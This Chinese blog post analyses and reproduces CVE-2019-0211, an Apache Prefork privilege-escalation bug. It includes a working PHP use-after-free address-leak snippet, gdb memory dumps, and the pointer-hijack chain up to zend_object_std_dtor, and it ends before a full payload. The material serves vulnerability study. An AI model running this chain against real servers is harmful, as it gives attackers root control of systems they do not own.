

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="John Doe">
  <meta name="keywords" content="">
  
    <meta name="description" content="CVE-2019-0211 Apache提权漏洞分析一、漏洞描述以及产生原因Apache MPM Prefork 的共享内存（SHM）、scoreboard 机制，以及 bucket 结构体的作用，最终讨论的是一个进程权限提升（Privilege Escalation）漏洞。这类漏洞通常涉及 共享内存管理不当，导致低权限进程能够控制高权限进程的执行流。 1. 基础概念在 MPM Prefork 模">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2019-0211 Apache提权漏洞复现">
<meta property="og:url" content="http://example.com/2025/03/25/CVE-2019-0211%20Apache%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
<meta property="og:site_name" content="ljhflag">
<meta property="og:description" content="CVE-2019-0211 Apache提权漏洞分析一、漏洞描述以及产生原因Apache MPM Prefork 的共享内存（SHM）、scoreboard 机制，以及 bucket 结构体的作用，最终讨论的是一个进程权限提升（Privilege Escalation）漏洞。这类漏洞通常涉及 共享内存管理不当，导致低权限进程能够控制高权限进程的执行流。 1. 基础概念在 MPM Prefork 模">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503261408900.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503261408003.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503261408186.png">
<meta property="article:published_time" content="2025-03-25T14:27:00.000Z">
<meta property="article:modified_time" content="2025-03-27T13:17:58.849Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="CVE复现">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503261408900.png">
  
  
  
  <title>CVE-2019-0211 Apache提权漏洞复现 - ljhflag</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"skSyD5RSTq4kiWeAhMeeY9ib-gzGzoHsz","app_key":"rQPg4V1fSy3hOP8QAyeJnyh8","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  
    <!-- Google tag (gtag.js) -->
    <script async>
      if (!Fluid.ctx.dnt) {
        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
          window.dataLayer = window.dataLayer || [];
          function gtag() {
            dataLayer.push(arguments);
          }
          gtag('js', new Date());
          gtag('config', '');
        });
      }
    </script>
  

  

  

  

  
    
  



  
<meta name="generator" content="Hexo 7.2.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Ljhflag</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="CVE-2019-0211 Apache提权漏洞复现"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-03-25 22:27" pubdate>
          2025年3月25日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          2.4k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          20 分钟
        
      </span>
    

    
    
      
        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="leancloud-page-views"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">CVE-2019-0211 Apache提权漏洞复现</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="CVE-2019-0211-Apache提权漏洞分析"><a href="#CVE-2019-0211-Apache提权漏洞分析" class="headerlink" title="CVE-2019-0211 Apache提权漏洞分析"></a>CVE-2019-0211 Apache提权漏洞分析</h1><h2 id="一、漏洞描述以及产生原因"><a href="#一、漏洞描述以及产生原因" class="headerlink" title="一、漏洞描述以及产生原因"></a>一、漏洞描述以及产生原因</h2><p>Apache <code>MPM Prefork</code> 的共享内存（SHM）、<code>scoreboard</code> 机制，以及 <code>bucket</code> 结构体的作用，最终讨论的是一个<strong>进程权限提升（Privilege Escalation）漏洞</strong>。<u>这类漏洞通常涉及 <strong>共享内存管理不当</strong>，导致低权限进程能够控制高权限进程的执行流。</u></p>
<h3 id="1-基础概念"><a href="#1-基础概念" class="headerlink" title="1. 基础概念"></a><strong>1. 基础概念</strong></h3><p>在 <code>MPM Prefork</code> 模式下，Apache 服务器的 <strong>主进程</strong> 运行在 <strong>root</strong> 权限，而负责处理 HTTP 请求的 <strong>Worker 进程</strong> 运行在 <strong>低权限用户（www-data）</strong>，这样可以减少安全风险。[<code>www-data</code> 是 Linux&#x2F;Unix 系统中 <strong>Web 服务器（如 Apache、Nginx）默认使用的低权限用户</strong>，用于运行 Web 相关的进程，如 <code>Worker</code> 进程，以提高安全性。]</p>
<h3 id="2-共享内存（SHM）"><a href="#2-共享内存（SHM）" class="headerlink" title="2. 共享内存（SHM）"></a><strong>2. 共享内存（SHM）</strong></h3><p>Apache 使用 <strong>共享内存（SHM，Shared Memory）</strong> 来存储 <code>Worker</code> 进程的状态信息，这样主进程可以监视 <code>Worker</code> 进程的运行情况。</p>
<p>Apache 使用的共享内存主要由 <strong>scoreboard（计分板）</strong> 组成，存储了：</p>
<ul>
<li><code>Worker</code> 进程的 PID（进程 ID）。</li>
<li>当前处理的 HTTP 请求状态。</li>
<li>连接信息、写入状态等。</li>
</ul>
<h3 id="3-bucket-结构"><a href="#3-bucket-结构" class="headerlink" title="3. bucket 结构"></a><strong>3. <code>bucket</code> 结构</strong></h3><p>在 Apache Prefork 里，每个 <code>Worker</code> 进程都对应一个 <strong>bucket</strong>（存储 <code>Worker</code> 进程的信息）</p>
<p>[Apache <strong>Prefork</strong> 是 Apache 服务器的 <strong>多进程（Process-based）MPM（多处理模块）</strong>]</p>
<ol>
<li><p><strong>当 Apache 重启时</strong>，主进程需要 <strong>关闭旧的 Worker 进程</strong>，防止它们继续处理请求。</p>
</li>
<li><p><strong>新的 Worker 进程需要占用旧的 Worker 进程释放的资源</strong>，这包括共享内存 <code>bucket</code>。</p>
</li>
<li><p>Apache 使用 <code>all_buckets</code> <strong>数组</strong> 来管理所有 <code>Worker</code> 进程的 <code>bucket</code>，并在重启时重新利用这些 <code>bucket</code> 结构。</p>
<p>**<code>bucket</code>**：[记录 Worker 进程的资源信息，Apache 重启时会使用]</p>
</li>
</ol>
<h3 id="4-漏洞成因：Worker-进程可修改-bucket"><a href="#4-漏洞成因：Worker-进程可修改-bucket" class="headerlink" title="4. 漏洞成因：Worker 进程可修改 bucket"></a><strong>4. 漏洞成因：Worker 进程可修改 <code>bucket</code></strong></h3><p>由于 <code>Worker</code> 进程<strong>可以修改自己在 <code>scoreboard</code> 中的 <code>bucket</code> 值</strong>，但 Apache 并<strong>没有对 <code>bucket</code> 值进行边界检查</strong>，攻击者可以：</p>
<ol>
<li>修改 <code>bucket</code> 让其指向 <strong>共享内存的其他区域</strong>。</li>
<li>伪造 <code>prefork_child_bucket</code> 结构，让 <code>mutex-&gt;meth-&gt;child_init</code> 指向恶意代码。</li>
<li>在 Apache <strong>重启</strong> 时，<code>child_init()</code> 以 <code>root</code> 权限执行，导致<strong>权限提升漏洞（Privilege Escalation）</strong>。</li>
</ol>
<p>漏洞利用路径：</p>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">Worker 进程（www-data） → 修改 bucket 值 → 控制 `child_init` 函数 → 在 root 权限下执行恶意代码<br></code></pre></td></tr></table></figure>

<h3 id="各个部分关系图"><a href="#各个部分关系图" class="headerlink" title="各个部分关系图"></a><strong>各个部分关系图</strong></h3><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-addition">+--------------------------------------+</span><br>| Apache 主进程（Root 权限）           |<br>| 监听端口，管理 Worker（低权限） 进程  |<br><span class="hljs-addition">+--------------------------------------+</span><br>            ↓  共享内存（SHM）<br><span class="hljs-addition">+--------------------------------------+</span><br>| Scoreboard（计分板）                 |<br>| - Worker 进程信息（PID, 状态, bucket）|<br><span class="hljs-addition">+--------------------------------------+</span><br>            ↓  通过 bucket 访问资源<br><span class="hljs-addition">+--------------------------------------+</span><br>| all_buckets[]（进程资源管理）         |<br>| - pod（进程通信）                    |<br>| - listeners（监听端口信息）           |<br>| - mutex（进程同步）                   |<br><span class="hljs-addition">+--------------------------------------+</span><br>            ↓  Apache 进程池<br><span class="hljs-addition">+--------------------------------------+</span><br>| Worker 进程（www-data 权限）          |<br>| 处理 HTTP 请求                        |<br><span class="hljs-addition">+--------------------------------------+</span><br></code></pre></td></tr></table></figure>

<h2 id="二、利用过程"><a href="#二、利用过程" class="headerlink" title="二、利用过程"></a>二、利用过程</h2><h3 id="大致步骤流程"><a href="#大致步骤流程" class="headerlink" title="大致步骤流程"></a>大致步骤流程</h3><p>1、获取Worker进程的读写权限.2、向共享内存空间（SHM）写入一个假的prefork_child_bucket结构。3、将all_bucket[bucket]指向结构。4、等待构造的函数被调用。</p>
<p>这一过程的好处：</p>
<p>始终没有创建过主进程，所有过程都映射在访问&#x2F;proc&#x2F;self&#x2F;maps(ASLR&#x2F;PIE保护无效)中，当一个Worker进程关闭或报错时，它会自动由主进程重新创建，所以不会有DOS Apache服务器的风险。</p>
<p>缺点：</p>
<p>PHP不允许对&#x2F;proc&#x2F;self&#x2F;mem的读写，也就是说我们没法直接编辑共享内存空间，只能等待重启的时候调用all_bucket函数。</p>
<h3 id="具体利用步骤：-大致了解"><a href="#具体利用步骤：-大致了解" class="headerlink" title="具体利用步骤：[大致了解]"></a>具体利用步骤：[大致了解]</h3><h3 id="1-获取Worker进程的读写权限"><a href="#1-获取Worker进程的读写权限" class="headerlink" title="1. 获取Worker进程的读写权限"></a>1. 获取Worker进程的读写权限</h3><p>PHP UAF的0day漏洞</p>
<p>由于mod_prefork函数经常和mod_php函数一起使用，因此可以从CVE-2019-6977这里下手实现漏洞的利用。我在写exp的过程中发现PHP7.X下的UAF 0day漏洞在PHP5.X中也能复现。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs php">PHP UAF<br><br><span class="hljs-meta">&lt;?php</span><br><br> <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">X</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">DateInterval</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">JsonSerializable</span></span><br><span class="hljs-class"></span><br><span class="hljs-class"></span>&#123;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">jsonSerialize</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function">  </span>&#123;<br><br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$y</span>, <span class="hljs-variable">$p</span>;<br><br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$y</span>[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-variable">$p</span> = <span class="hljs-variable language_">$this</span>-&gt;y;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>;<br><br>  &#125;<br><br>&#125;<br><br> <br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_aslr</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function"></span>&#123;<br><br>  <span class="hljs-keyword">global</span> <span class="hljs-variable">$p</span>, <span class="hljs-variable">$y</span>;<br><br>  <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>;<br><br> <br><br>  <span class="hljs-variable">$y</span> = [<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">X</span>(<span class="hljs-string">&#x27;PT1S&#x27;</span>)];<br><br>  <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-number">1234</span> =&gt; &amp;<span class="hljs-variable">$y</span>]);<br><br>  <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;ADDRESS: 0x&quot;</span> . <span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$p</span>) . <span class="hljs-string">&quot;n&quot;</span>);<br><br> <br><br>  <span class="hljs-keyword">return</span> <span class="hljs-variable">$p</span>;<br><br>&#125;<br><br> <br><br><span class="hljs-title function_ invoke__">get_aslr</span>();<br></code></pre></td></tr></table></figure>



<p>这里有一个PHP对象的UAF：即使我们无法设置$y<a href="X%E7%9A%84%E4%B8%80%E4%B8%AA%E5%AE%9E%E4%BE%8B">0</a>，我们也可以利用$this。</p>
<p>UAF的读写权限</p>
<p>我们想要实现两个目标：读取内存地址来找到all_buckets的位置，修改SHM来改变bucket的值，从而加上我们自己的结构。</p>
<p>好在PHP的堆正好在这两片地址区域的前面。</p>
<p>PHP堆的内存地址，ap_scoreboard_image-&gt;*和all_buckets</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@apaubuntu:~<span class="hljs-comment"># cat /proc/6318/maps | grep libphp | grep rw-p</span><br><br>7f4a8f9f3000-7f4a8fa0a000 rw-p 00471000 08:02 542265 /usr/lib/apache2/modules/libphp7.2.so<br><br> <br><br>(gdb) p *ap_scoreboard_image<br><br><span class="hljs-variable">$14</span> = &#123;<br><br>  global = 0x7f4a9323e008,<br><br>  parent = 0x7f4a9323e020,<br><br>  servers = 0x55835eddea78<br><br>&#125;<br><br>(gdb) p all_buckets<br><br><span class="hljs-variable">$15</span> = (prefork_child_bucket *) 0x7f4a9336b3f0<br></code></pre></td></tr></table></figure>

<p>考虑到我们触发了PHP对象中的UAF，对象中的任意属性都属于UAF漏洞的范围。我们可以将zend_object UAF改为zend_string，从而获得一个zend_string结构。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs rust">(gdb) p<span class="hljs-keyword">type</span> <span class="hljs-title class_">zend_string</span><br><br><span class="hljs-keyword">type</span> = <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_zend_string</span> &#123;<br><br>    zend_refcounted_h gc;<br><br>    zend_ulong h;<br><br>    size_t len;<br><br>    <span class="hljs-type">char</span> val[<span class="hljs-number">1</span>];<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>len属性包括了字符串的长度，通过增加它，我们可以读写之后的内存空间，也就是说能访问到我们感兴趣的两个内存空间：SHM和Apache的all_buckets</p>
<p>找到bucket的index值和all_bucket</p>
<p>我们需要改变ap_scoreboard_image-&gt;parent[worker_id]-&gt;bucket来获得特定的worker_id。好在这个结构每次都在共享内存空间的头部位置，很方便我们去定位。</p>
<p>共享内存空间和目标process_socre结构</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs ruby">root<span class="hljs-variable">@apaubuntu</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># cat /proc/6318/maps | grep rw-s</span><br><br>7f4a9323e000-7f4a93252000 rw-s <span class="hljs-number">00000000</span> <span class="hljs-number">00</span><span class="hljs-symbol">:</span><span class="hljs-number">05</span> <span class="hljs-number">57052</span>                      /dev/zero (deleted)<br><br> <br><br>(gdb) p &amp;ap_scoreboard_image-&gt;parent[<span class="hljs-number">0</span>]<br><br><span class="hljs-variable">$18</span> = (process_score *) <span class="hljs-number">0x7f4a9323e020</span><br><br>(gdb) p &amp;ap_scoreboard_image-&gt;parent[<span class="hljs-number">1</span>]<br><br><span class="hljs-variable">$19</span> = (process_score *) <span class="hljs-number">0x7f4a9323e044</span><br></code></pre></td></tr></table></figure>

<p>要定位all_bucket，我们需要充分利用prefork_child_bucket结构，所以我们需要：</p>
<p>导入bucket值的结构</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs cpp">prefork_child_bucket &#123;<br><br>    <span class="hljs-type">ap_pod_t</span> *pod;<br><br>    ap_listen_rec *listeners;<br><br>    <span class="hljs-type">apr_proc_mutex_t</span> *mutex; &lt;--<br><br>&#125;<br><br> <br><br><span class="hljs-type">apr_proc_mutex_t</span> &#123;<br><br>    <span class="hljs-type">apr_pool_t</span> *pool;<br><br>    <span class="hljs-type">const</span> <span class="hljs-type">apr_proc_mutex_unix_lock_methods_t</span> *meth; &lt;--<br><br>    <span class="hljs-type">int</span> curr_locked;<br><br>    <span class="hljs-type">char</span> *fname;<br><br> <br><br>    ...<br><br>&#125;<br><br> <br><br><span class="hljs-type">apr_proc_mutex_unix_lock_methods_t</span> &#123;<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br><br>    <span class="hljs-built_in">apr_status_t</span> (*create)(<span class="hljs-type">apr_proc_mutex_t</span> *, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *);<br><br>    <span class="hljs-built_in">apr_status_t</span> (*acquire)(<span class="hljs-type">apr_proc_mutex_t</span> *);<br><br>    <span class="hljs-built_in">apr_status_t</span> (*tryacquire)(<span class="hljs-type">apr_proc_mutex_t</span> *);<br><br>    <span class="hljs-built_in">apr_status_t</span> (*release)(<span class="hljs-type">apr_proc_mutex_t</span> *);<br><br>    <span class="hljs-built_in">apr_status_t</span> (*cleanup)(<span class="hljs-type">void</span> *);<br><br>    <span class="hljs-built_in">apr_status_t</span> (*child_init)(<span class="hljs-type">apr_proc_mutex_t</span> **, <span class="hljs-type">apr_pool_t</span> *, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *); &lt;--<br><br>    <span class="hljs-built_in">apr_status_t</span> (*perms_set)(<span class="hljs-type">apr_proc_mutex_t</span> *, <span class="hljs-type">apr_fileperms_t</span>, <span class="hljs-type">apr_uid_t</span>, <span class="hljs-type">apr_gid_t</span>);<br><br>    apr_lockmech_e mech;<br><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *name;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>all_buckets[0]-&gt;mutex会定位在同一个all_buckets[0]的内存区域，考虑到meth是一个静态结构，它会定位到libapr的data上，又因为meth指向了libapr的函数，所以每一个函数的指针都在libapr的text内。</p>
<p>到这里我们通过&#x2F;proc&#x2F;self&#x2F;maps有了整片内存区域的地址信息，我们可以通过修改Apache内存的指针来找到all_buckets[0]对应的结构位置。</p>
<p>和我之前说的一样，all_bucket的地址在每次重启都会发生变化。所以说每次触发我们的exp，all_buckets的地址都会发生变化。之后我们会研究如何解决这问题。</p>
<h3 id="2-向共享内存空间（SHM）写入假的prefork-child-bucket结构"><a href="#2-向共享内存空间（SHM）写入假的prefork-child-bucket结构" class="headerlink" title="2. 向共享内存空间（SHM）写入假的prefork_child_bucket结构"></a>2. 向共享内存空间（SHM）写入假的prefork_child_bucket结构</h3><p>实现函数的调用</p>
<p>如下是构造的调用函数的过程：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp">bucket_id = ap_scoreboard_image-&gt;parent[id]-&gt;bucket<br><br>my_bucket = all_buckets[bucket_id]<br><br>mutex = &amp;my_bucket-&gt;mutex<br><br><span class="hljs-built_in">apr_proc_mutex_child_init</span>(mutex)<br><br>(*mutex)-&gt;meth-&gt;<span class="hljs-built_in">child_init</span>(mutex, pool, fname)<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503261408900.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>调用适合的函数</p>
<p>要实现漏洞利用，我们需要让(*mutex)-&gt;meth-&gt;child_init指向zend_object_std_dtor(zend_object *object)，也就是下面的利用过程：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php">mutex = &amp;my_bucket-&gt;mutex<br><br>[<span class="hljs-keyword">object</span> = mutex]<br><br><span class="hljs-title function_ invoke__">zend_object_std_dtor</span>(<span class="hljs-keyword">object</span>)<br><br>ht = <span class="hljs-keyword">object</span>-&gt;properties<br><br><span class="hljs-title function_ invoke__">zend_array_destroy</span>(ht)<br><br><span class="hljs-title function_ invoke__">zend_hash_destroy</span>(ht)<br><br>val = &amp;ht-&gt;arData[<span class="hljs-number">0</span>]-&gt;val<br><br>ht-&gt;<span class="hljs-title function_ invoke__">pDestructor</span>(val)<br></code></pre></td></tr></table></figure>

